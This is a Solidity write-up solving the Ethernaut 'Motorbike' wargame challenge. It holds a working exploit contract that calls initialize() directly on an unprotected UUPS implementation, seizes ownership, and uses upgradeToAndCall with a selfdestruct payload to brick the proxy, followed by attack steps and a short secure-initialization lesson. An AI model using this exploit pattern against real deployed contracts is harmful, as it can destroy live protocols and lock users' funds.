// Ethernaut Challenge #25: Motorbike
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
 * MOTORBIKE CHALLENGE
 * 
 * Goal: Selfdestruct the Engine implementation and brick the proxy.
 * 
 * THE ARCHITECTURE:
 * - Motorbike: UUPS proxy contract
 * - Engine: Implementation contract (separate from proxy)
 * 
 * THE VULNERABILITY:
 * The Engine contract is deployed separately and then referenced.
 * If Engine has its own initialization that's separate from
 * the proxy's initialization, we can call initialize() directly
 * on the Engine contract itself (not through proxy)!
 * 
 * When initialize() is called directly on Engine:
 * - msg.sender = us (attacker)
 * - _owner = us
 * - We become owner of the Engine implementation
 * 
 * Then we can call upgradeToAndCall() to selfdestruct!
 * 
 * WHY THIS IS BAD:
 * - Proxy still points to Engine address
 * - Engine is now destroyed
 * - All delegatecalls from proxy to Engine will fail
 * - The proxy is bricked forever
 */

contract MotorbikeExploit {
    Engine public engine;
    Motorbike public motorbike;
    
    constructor(address _engine) {
        engine = Engine(_engine);
    }
    
    function attack() external {
        // Step 1: Call initialize() directly on Engine
        // (not through proxy - directly on implementation)
        engine.initialize();
        
        // Step 2: We're now owner of Engine
        // Deploy a contract that selfdestructs when called
        SelfDestructor destructor = new SelfDestructor();
        
        // Step 3: Upgrade Engine to our malicious contract
        // Then call it to trigger selfdestruct
        engine.upgradeToAndCall(
            address(destructor),
            abi.encodeWithSelector(SelfDestructor.destroy.selector)
        );
    }
}

contract SelfDestructor {
    function destroy() external {
        selfdestruct(payable(msg.sender));
    }
}

contract Motorbike {
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
    constructor(address _engine) {
        // Delegatecall to initialize the proxy
        (bool success,) = _engine.delegatecall(
            abi.encodeWithSignature("initialize()")
        );
        require(success);
    }
    
    fallback() external payable {
        _delegate(_getImplementation());
    }
    
    function _delegate(address implementation) internal {
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
    
    function _getImplementation() internal view returns (address) {
        address implementation;
        bytes32 slot = _IMPLEMENTATION_SLOT;
        assembly {
            implementation := sload(slot)
        }
        return implementation;
    }
}

contract Engine {
    address public upgrader;
    uint256 public horsePower;
    address public owner;
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    function initialize() external {
        require(owner == address(0), "Already initialized");
        owner = msg.sender; // ← If called directly, we become owner!
        horsePower = 1000;
    }
    
    function upgradeToAndCall(address newImplementation, bytes memory data) external onlyOwner {
        (bool success,) = newImplementation.delegatecall(data);
        require(success);
    }
}

/*
 * ATTACK STEPS:
 * 
 * 1. Find Engine implementation address
 *    - Check Motorbike storage slot 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
 *    - Or look at deployment transaction
 * 
 * 2. Deploy MotorbikeExploit with Engine address
 * 
 * 3. Call attack():
 *    - engine.initialize() → we become owner of Engine
 *    - Deploy SelfDestructor
 *    - engine.upgradeToAndCall(destructor, destroy())
 *    - Selfdestruct runs, Engine is destroyed
 * 
 * 4. Motorbike proxy now points to a destroyed contract
 *    - All calls fail
 *    - Proxy is bricked
 * 
 * LESSON:
 * - Implementation contracts need their own initialization protection
 * - Don't assume initialize() will only be called through proxy
 * - Mark implementation contracts as initialized in constructor
 * - Or use factory pattern where implementation is deployed atomically
 * 
 * SECURE PATTERN:
 * constructor() {
 *     owner = address(1); // Prevent direct initialization
 * }
 * 
 * Or:
 * function initialize() external {
 *     require(!initialized, "Already initialized");
 *     require(address(this) != implementation, "Direct call");
 *     // ...
 * }
 */
